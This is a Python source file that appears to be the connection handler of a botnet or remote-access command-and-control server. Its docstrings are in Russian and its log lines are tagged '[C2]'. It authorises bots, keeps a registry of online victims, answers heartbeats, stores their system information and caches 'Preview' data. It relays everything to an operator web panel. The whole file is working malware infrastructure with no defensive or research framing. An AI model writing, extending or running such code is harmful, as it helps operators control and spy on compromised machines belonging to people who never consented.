# backend/Core/ClientConnection.py
import json, asyncio, socket, logs.LoggerWrapper as logger
from backend.Core.network import read_packet, pack_packet
from backend.Services.Auth import authorize_bot, get_full_db, sync_bot_data
from backend.Services.ClientManager import active_clients
from backend.BenchUtils import add_bytes

preview_cache = {}

class BotConnectionHandler:
    "Обработка соединений ботов и трансляция данных в API"
    async def handle_new_connection(self, reader, writer):
        bot_id, peer = None, writer.get_extra_info("peername")[0]
        if (sock := writer.get_extra_info('socket')): sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        try:
            if not (res := await authorize_bot(reader, peer)): return await self._force_close(writer)
            bot_id, _ = res
            active_clients[bot_id] = (reader, writer)
            self._broadcast_db_state(); logger.Log.info(f"[C2] Bot {bot_id} online")
            if (p := preview_cache.get(bot_id)): self._send_raw(p)

            while True:
                try: bid, mod, pay = await asyncio.wait_for(read_packet(reader), 10.0)
                except asyncio.TimeoutError: break
                if not bid: break
                
                add_bytes(6 + len(bid) + len(mod) + (len(pay) if isinstance(pay, bytes) else len(str(pay))))
                
                if mod == "Heartbeat" and pay == "ping":
                    writer.write(pack_packet(bid, "Heartbeat", "pong")); await writer.drain()
                elif mod == "SystemInfo":
                    self._to_panel(bid, mod, sync_bot_data(bid, pay), is_json=True)
                elif mod == "Preview":
                    preview_cache[bid] = pack_packet(bid, mod, pay)
                    self._send_raw(preview_cache[bid])
                else: self._to_panel(bid, mod, pay)
        except Exception as e: logger.Log.error(f"[C2] Handler Err [{bot_id}]: {e}")
        finally: await self._disconnect(bot_id, writer)

    def _broadcast_db_state(self):
        "Синхронизация списка ботов с фронтендом"
        from backend.API import manager
        bots = [{"id": k, "status": ("online" if k in active_clients else "offline"), **v} for k, v in get_full_db().items()]
        manager.broadcast_packet_sync(pack_packet("SERVER", "SystemInfo", json.dumps(bots, ensure_ascii=False)))

    def _to_panel(self, bid, mod, pay, is_json=False):
        "Проксирование данных в веб-панель"
        from backend.API import manager
        p = json.dumps(pay, ensure_ascii=False) if is_json else pay
        manager.broadcast_packet_sync(pack_packet(bid, mod, p))

    def _send_raw(self, pkg):
        from backend.API import manager
        manager.broadcast_packet_sync(pkg)

    async def _disconnect(self, bid, writer):
        if bid in active_clients:
            active_clients.pop(bid); sync_bot_data(bid, {"status": "offline"})
            self._broadcast_db_state(); logger.Log.warning(f"[C2] Bot {bid} disconnected")
        await self._force_close(writer)

    async def _force_close(self, writer):
        try: writer.close(); await asyncio.wait_for(writer.wait_closed(), 1)
        except: pass